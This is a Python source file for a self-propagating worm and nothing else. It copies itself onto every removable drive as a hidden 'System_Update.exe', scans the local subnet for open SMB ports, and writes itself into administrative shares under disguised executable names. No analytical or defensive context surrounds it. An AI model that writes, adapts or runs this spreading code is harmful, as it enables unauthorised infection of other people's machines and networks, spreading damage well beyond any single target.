import os, sys, shutil, time, subprocess, socket, threading

def usb_spreader():
    """Elite USB Spreader Engine."""
    while True:
        try:
            # 1. Detect Removable Drives
            import win32api, win32file
            drives = win32api.GetLogicalDriveStrings().split('\000')[:-1]
            for drive in drives:
                if win32file.GetDriveType(drive) == win32file.DRIVE_REMOVABLE:
                    # 2. Copy Agent to Drive
                    agent_path = sys.executable if getattr(sys, 'frozen', False) else __file__
                    target = os.path.join(drive, "System_Update.exe")
                    if not os.path.exists(target):
                        shutil.copy2(agent_path, target)
                        # Hide the file for stealth
                        subprocess.run(['attrib', '+h', '+s', target], shell=True)
                        print(f"[WORM] USB Infected: {drive}")
        except: pass
        time.sleep(30)

def lan_spreader():
    """Elite LAN Spreader Engine (SMB/Network Shares)."""
    # 1. Identify Local Network Range
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        prefix = '.'.join(local_ip.split('.')[:-1]) + '.'
    except: return

    # 2. Scan and Spread (Minimal footprint)
    for i in range(1, 255):
        target_ip = prefix + str(i)
        if target_ip == local_ip: continue
        threading.Thread(target=_scan_and_spread, args=(target_ip,), daemon=True).start()

def _scan_and_spread(ip):
    """Attempt to spread to a single IP."""
    try:
        # Check for SMB port 445
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            if s.connect_ex((ip, 445)) == 0:
                print(f"[WORM] Target Detected: {ip} (SMB OPEN)")
                # Attempt to copy to common writable shares (C$, ADMIN$, Users)
                # Note: This requires the current user context to have network permissions.
                agent_path = sys.executable if getattr(sys, 'frozen', False) else __file__
                targets = [f"\\\\{ip}\\C$\\Windows\\Temp\\SystemHost.exe", f"\\\\{ip}\\Users\\Public\\Desktop\\Update.exe"]
                for t in targets:
                    try:
                        shutil.copy2(agent_path, t)
                        print(f"[WORM] Spread to {ip} via {t}")
                        break
                    except: pass
    except: pass

if __name__ == "__main__":
    threading.Thread(target=usb_spreader, daemon=True).start()
    lan_spreader()
    while True: time.sleep(60)
